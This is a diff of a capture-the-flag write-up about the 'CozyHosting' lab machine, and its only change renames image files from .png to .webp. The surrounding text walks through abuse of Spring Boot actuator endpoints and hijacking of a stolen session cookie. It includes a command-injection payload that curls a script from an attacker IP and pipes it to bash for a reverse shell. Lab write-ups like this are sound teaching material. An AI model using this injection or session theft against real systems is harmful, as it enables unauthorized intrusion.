@@ -25,43 +25,43 @@ The scan returns open ports on 80 and 22 (HTTP & SSH), which is common for serve
 
 A quick look over the HTTP service on port 80, we see it responds with a `Whitelabel Error Page` when a request yields an error status code.
 
-![whitelabel_error.png](/img/cozyhosting_img/whitelabel_error.png)
+![whitelabel_error.png](/img/cozyhosting_img/whitelabel_error.webp)
 
 A quick google search for this indicates that we are being shown a default error page for the `Spring Boot` framework.
 
-![spring.png](/img/cozyhosting_img/spring.png)
+![spring.png](/img/cozyhosting_img/spring.webp)
 
 [The Spring framework has `Actuator` endpoints](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators) - intended for debugging purposes - though we can gather a lot of useful information (or even vulnerability-dependent code execution)
 if they are available to us.  The `/actuator` route tells us that a handful of debugging endpoints are enabled, and we're able to access *most* of them.
 
-![actuator_dir.png](/img/cozyhosting_img/actuator_dir.png)
+![actuator_dir.png](/img/cozyhosting_img/actuator_dir.webp)
 
 Enumerating each endpoint involved navigating to the URI, examining the content, and attempting to utilize any relevant information in requests. This strategy seems like it was the best route here, as trying to write a script to automate keyword collection
 would likely be far less efficient given I'm not entirely sure what I'm looking for.
 
 We arrive at the /actuator/mappings endpoint, which lists application mappings. Among these, we notice a route to a ‘sessions’ endpoint, potentially revealing active session information.
 
-![mappings.png](/img/cozyhosting_img/mappings.png)
+![mappings.png](/img/cozyhosting_img/mappings.webp)
 
 ## Initial access
 
 On this actuator endpoint, rather than getting ****just**** usernames, we are given what is likely a session token for a user named `kanderson`
 
-![sess](/img/cozyhosting_img/sessions.png)
+![sess](/img/cozyhosting_img/sessions.webp)
 
 I had already replaced my assigned cookie with kanderson's in Chrome in the screenshot above, but the concept remains the same.
 
 Impersonating `kanderson`, we can go back to the login page and refresh it to be redirected to the admin dashboard. Here we see an automatic patching tool for an `ssh` service.
 
-![admin-panel.png](/img/cozyhosting_img/admin-panel.png)
+![admin-panel.png](/img/cozyhosting_img/admin-panel.webp)
 
 Trying to create a direct connection back to our machine throws a timeout error, even with `sshd` running - maybe on account of a private key mismatch (though it was probably not intended to ever *actually* function considering it was purpose-built for a CTF), but we can tell from the error URL parameters that the app is running `ssh` commands directly from a shell:
 
-![ssh-params](/img/cozyhosting_img/ssh-params.png)
+![ssh-params](/img/cozyhosting_img/ssh-params.webp)
 
 Strings from a `ssh` shell error
 
-![redirect](/img/cozyhosting_img/redirect-showing-bash.png)
+![redirect](/img/cozyhosting_img/redirect-showing-bash.webp)
 
 Confirmed by the error output, which contains the entire output of a `ssh` error
 
@@ -87,7 +87,7 @@ host=n&username=%3bcurl${IFS}<http://10.10.14.40:9990/hello.sh|/bin/bash%3b${IFS
 > Note that this method could probably be simplified; this is just what wound up working for me in the moment.
 >
 
-![reverse-shell-success](/img/cozyhosting_img/reverse-shell-success.png)
+![reverse-shell-success](/img/cozyhosting_img/reverse-shell-success.webp)
 
 We can copy the `.jar` file from the remote machine to ours to browse it's filesystem; I assume this is what the HTTP service uses as its designated file system (Spring Boot is a Java-based application), though I've never developed web services with Java, though `JAR`, being a contraction of "Java archive", can be extracted with an archive utility into a (partially) readable filesystem - though we aren't performing a decompilation, so we won't get 100% readable source.
 
